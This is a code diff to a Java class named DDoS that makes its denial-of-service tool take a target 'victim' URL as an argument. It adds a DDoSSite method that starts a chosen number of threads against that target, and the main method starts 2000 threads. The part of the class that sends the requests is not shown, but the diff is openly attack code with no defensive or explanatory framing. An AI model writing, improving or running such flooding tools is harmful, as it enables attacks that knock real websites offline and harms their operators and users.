@@ -9,10 +9,16 @@ public class DDoS {
 	 
     public static void main(String... args) throws Exception {
         for (int i = 0; i < 2000; i++) {
-            DdosThread thread = new DdosThread();
+            DdosThread thread = new DdosThread(args[0]);
             thread.start();
         } 
     }    
+    public static void DDoSSite(String victim, int threads) throws Exception{
+        for (int i = 0; i < threads; i++) {
+            DdosThread thread = new DdosThread(victim);
+            thread.start();
+        }
+    }
    
      
  
@@ -24,8 +30,8 @@ public class DDoS {
  
         String param = null;
  
-        public DdosThread() throws Exception {
-            url = new URL(request);
+        public DdosThread(String urlToRequest) throws Exception {
+            url = new URL(urlToRequest);
             param = "param1=" + URLEncoder.encode("87845", "UTF-8");
         } 
  
